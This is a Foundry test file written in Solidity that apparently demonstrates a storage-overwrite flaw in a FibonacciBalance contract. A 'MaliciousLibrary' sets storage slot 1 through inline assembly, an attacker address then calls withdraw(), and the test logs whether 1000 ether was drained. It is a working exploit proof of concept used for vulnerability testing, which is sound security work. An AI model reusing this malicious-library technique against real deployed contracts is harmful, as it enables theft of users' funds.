// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/FibonacciBalance.sol";

contract MaliciousLibrary {
    function setFibonacci(uint) public {
        assembly {
            sstore(1, 1000)
        }
    }
}

contract FibonacciBalanceTest is Test {
    FibonacciBalance fibBal;
    MaliciousLibrary malLib;
    address attacker = address(0xBAD);

    function setUp() public {
        malLib = new MaliciousLibrary();
        fibBal = new FibonacciBalance{value: 1000 ether}(address(malLib));
        
        assertEq(address(fibBal).balance, 1000 ether, "Initial contract balance");
        assertEq(attacker.balance, 0, "Attacker initial balance");
    }

    function testMaliciousWithdraw() public {
        // Pre-attack state capture
        console.log("--- BEFORE-Trigger ---");
        uint256 contractBalanceBefore = address(fibBal).balance;
        uint256 attackerBalanceBefore = attacker.balance;
        uint256 fibNumBefore = fibBal.calculatedFibNumber();
        
        console.log("Contract Balance Before: %s", contractBalanceBefore);
        console.log("Attacker Balance Before: %s", attackerBalanceBefore);
        console.log("Fibonacci Number Before: %s", fibNumBefore);

        // Execute attack
        console.log("--- Trigger: withdraw() call ---");
        vm.prank(attacker);
        fibBal.withdraw();

        // Post-attack state capture
        console.log("--- AFTER-Trigger ---");
        uint256 contractBalanceAfter = address(fibBal).balance;
        uint256 attackerBalanceAfter = attacker.balance;
        uint256 fibNumAfter = fibBal.calculatedFibNumber();
        
        console.log("Contract Balance After: %s", contractBalanceAfter);
        console.log("Attacker Balance After: %s", attackerBalanceAfter);
        console.log("Fibonacci Number After: %s", fibNumAfter);
        
        // Differential validation
        bool fundsStolen = (attackerBalanceAfter == attackerBalanceBefore + 1000 ether) && 
                           (contractBalanceAfter == contractBalanceBefore - 1000 ether);
        bool fibNumManipulated = fibNumBefore == 1000 && fibNumAfter == 1000;
        
        console.log("Attacker gained 1000 ether: %s", fundsStolen ? "YES" : "NO");
        console.log("Fibonacci number maintained at 1000: %s", fibNumManipulated ? "YES" : "NO");
        
        // Final verdict based on all checks
        if (fundsStolen && fibNumManipulated) {
            console.log("Vulnerability Exists: Attacker manipulated Fibonacci number to steal ETH");
        } else {
            console.log("Vulnerability not Exist: State changes not consistent with exploitation");
        }
    }
}